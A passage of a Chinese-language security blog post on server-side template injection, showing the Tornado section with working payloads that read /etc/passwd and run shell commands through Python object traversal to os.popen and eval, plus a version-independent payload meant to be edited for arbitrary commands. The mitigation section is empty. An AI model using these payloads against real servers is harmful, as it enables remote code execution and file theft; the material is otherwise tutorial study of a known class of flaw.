class="line">`[].__class__.__bases__[0].__subclasses__()[40]` 为 `&lt;type &apos;file&apos;&gt;`</span><br><span class="line">`().__class__.__bases__[0].__subclasses__()[72]` 为 `&lt;class &apos;site._Printer&apos;&gt;`</span><br><span class="line">`[].__class__.__bases__[0].__subclasses__()[59]` 为 `&lt;class &apos;warnings.WarningMessage&apos;&gt;`)</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>测试结果</li>
+<li>缓解措施</li>
+</ol>
+<h3 id="python下tornado"><a href="#python下tornado" class="headerlink" title="python下tornado"></a>python下tornado</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">1. 漏洞成因</span><br><span class="line"></span><br><span class="line">tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&#123;&#123;&#125;&#125;进行传递变量和执行简单的表达式。攻击者利用tornado特性和python语言的特性，通过魔术方法可以利用python执行命令，也可以利用tornado本身的特性，通过模板本身的特有变量读取配置文件。</span><br><span class="line"></span><br><span class="line">__class__　　：返回一个实例所属的类通过从子类寻找基类，</span><br><span class="line">__mro__　  ：返回一个包含对象所继承的基类元组，</span><br><span class="line">__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）方法在解析时按照元组的顺序解析。</span><br><span class="line">__subclasses__　　：以列表返回类的子类</span><br><span class="line">__init__　　 ：类的初始化方法</span><br><span class="line">__globals__　　   ：对包含函数全局变量的字典的引用</span><br><span class="line">__builtin__&amp;&amp;__builtins__　　：python中可以直接运行一些函数，例如eval()</span><br><span class="line"></span><br><span class="line">2. 测试用例</span><br><span class="line">python3</span><br><span class="line"></span><br><span class="line">&#123;&#123;256*256&#125;&#125;</span><br><span class="line">&#123;&#123;handler.settings&#125;&#125;</span><br><span class="line">&#123;&#123;&apos;&apos;.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__[&apos;popen&apos;](&apos;cat /etc/passwd&apos;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;&apos;&apos;.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__[&apos;popen&apos;](&apos;whoami&apos;).read()&#125;&#125;</span><br><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&apos;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">最后是这个自动适应版本的payload，根据Jinja2的poc配合tornado语法修改得来，会自动根据python版本搜索对应的函数执行命令，要改变执行的命令，请修改whoami部分为其它命令。</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &apos;eval&apos; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&apos;) &#125;&#125;</span><br><span class="line">    &#123;% end %&#125;</span><br><span class="line">  &#123;% end %&#125;</span><br><span class="line">  &#123;% end %&#125;</span><br><span class="line">&#123;% end %&#125;</span><br><span class="line">&#123;% end %&#125;</span><br><span class="line"></span><br><span class="line">(本地测试环境为python3.8.5，根据python版本的不同也许需要手动调整测试用例，通用payload可无视python版本。`&apos;&apos;.__class__.__mro__[1].__subclasses__()[138]` 为 `&lt;class &apos;os._wrap_close&apos;&gt;`)</span><br><span class="line"></span><br><span class="line">python2</span><br><span class="line"></span><br><span class="line">&#123;&#123;256*256&#125;&#125;</span><br><span class="line">&#123;&#123;handler.settings&#125;&#125; </span><br><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[40](&apos;/etc/passwd&apos;).read()&#125;&#125; </span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[72].__init__.__globals__[&apos;os&apos;].system(&apos;whoami&apos;)&#125;&#125; 注意这个命令不会返回结果，只返回状态码(0或者1)，0表示成功执行，1表示执行出错或者失败。</span><br><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;whoami&apos;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">最后是这个自动适应版本的payload，根据Jinja2的poc配合tornado语法修改得来，会自动根据python版本搜索对应的函数执行命令，要改变执行的命令，请修改whoami部分为其它命令。</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &apos;eval&apos; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&apos;) &#125;&#125;</span><br><span class="line">    &#123;% end %&#125;</span><br><span class="line">  &#123;% end %&#125;</span><br><span class="line">  &#123;% end %&#125;</span><br><span class="line">&#123;% end %&#125;</span><br><span class="line">&#123;% end %&#125;</span><br><span class="line"></span><br><span class="line">本地测试环境为python2.7.16，根据python版本的不同也许需要手动调整测试用例，通用payload可无视python版本。</span><br><span class="line"></span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40] 为 &lt;type &apos;file&apos;&gt;</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[72] 为 &lt;class &apos;site._Printer&apos;&gt;</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59] 为 &lt;class &apos;warnings.WarningMessage&apos;&gt;)</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>测试结果</li>
+<li>缓解措施</li>
+</ol>
+<h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><h2 id="六、参考链接"><a href="#六、参考链接" class="headerlink" title="六、参考链接"></a>六、参考链接</h2><p><a href="https://portswigger.net/research/server-side-template-injection" target="_blank" rel="noopener">https://portswigger.net/research/server-side-template-injection</a><br><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/</a><br><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a><br><a href="https://www.anquanke.com/post/id/188172" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188172</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a><br><a href="https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/" target="_blank" rel="noopener">https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/</a><br><a href="https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability" target="_blank" rel="noopener">https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability</a><br><a href="https://www.cnblogs.com/bmjoker/p/13508538.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/13508538.html</a><br><a href="https://github.com/CTFTraining/huwangbei_2018_easy_tornado/blob/master/ssti_tornado.py" target="_blank" rel="noopener">https://github.com/CTFTraining/huwangbei_2018_easy_tornado/blob/master/ssti_tornado.py</a><br><a href="https://gosecure.github.io/template-injection-workshop/#0" target="_blank" rel="noopener">https://gosecure.github.io/template-injection-workshop/#0</a><br><a href="https://github.com/GoSecure/template-injection-workshop" target="_blank" rel="noopener">https://github.com/GoSecure/template-injection-workshop</a><br><a href="https://velocity.apache.org/tools/devel/apidocs/org/apache/velocity/tools/generic/ClassTool.html" target="_blank" rel="noopener">https://velocity.apache.org/tools/devel/apidocs/org/apache/velocity/tools/generic/ClassTool.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/02/21/%E5%90%84%E4%B8%AA%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AE%89%E5%85%A8%E7%BC%BA%E9%99%B7tips/" rel="next" title="各个语言的安全缺陷tips">
+                <i class="fa fa-chevron-left"></i> 各个语言的安全缺陷tips
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
+                alt="irrik" />
+            
+              <p class="site-author-name" itemprop="name">irrik</p>
+              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">52</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSTI"><span class="nav-number">1.</span> <span class="nav-text">SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、概述"><span class="nav-number">1.1.</span> <span class="nav-text">一、概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、攻击场景和范围"><span class="nav-number">1.2.</span> <span class="nav-text">二、攻击场景和范围</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、技术分析"><span class="nav-number">1.3.</span> <span class="nav-text">三、技术分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#模板语法分析"><span class="nav-number">1.3.1.</span> <span class="nav-text">模板语法分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注入位置与类型分析"><span class="nav-number">1.3.2.</span> <span class="nav-text">注入位置与类型分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见绕过手法"><span class="nav-number">1.3.3.</span> <span class="nav-text">常见绕过手法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、攻击方法"><span class="nav-number">1.4.</span> <span class="nav-text">四、攻击方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JAVA下SSTI注入攻击Velocity"><span class="nav-number">1.4.1.</span> <span class="nav-text">JAVA下SSTI注入攻击Velocity</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JAVA下SSTI注入攻击FreeMarker"><span class="nav-number">1.4.2.</span> <span class="nav-text">JAVA下SSTI注入攻击FreeMarker</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JAVA下SSTI注入攻击Spring-View-manipulation-以Thymeleaf为例"><span class="nav-number">1.4.3.</span> <span class="nav-text">JAVA下SSTI注入攻击Spring View manipulation (以Thymeleaf为例)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PYTHON下jinja2"><span class="nav-number">1.4.4.</span> <span class="nav-text">PYTHON下jinja2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python下tornado"><span class="nav-number">1.4.5.</span> <span class="nav-text">python下tornado</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、总结"><span class="nav-number">1.5.</span> <span class="nav-text">五、总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六、参考链接"><span class="nav-number">1.6.</span> <span class="nav-text">六、参考链接</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">irrik</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">206.7k</span>
+  
+</div>
+
+
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_uv">
+		本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+	<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_pv">
+		本站访问量<span id="busuanzi_value_site_pv"></span>
+	</span>
+</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
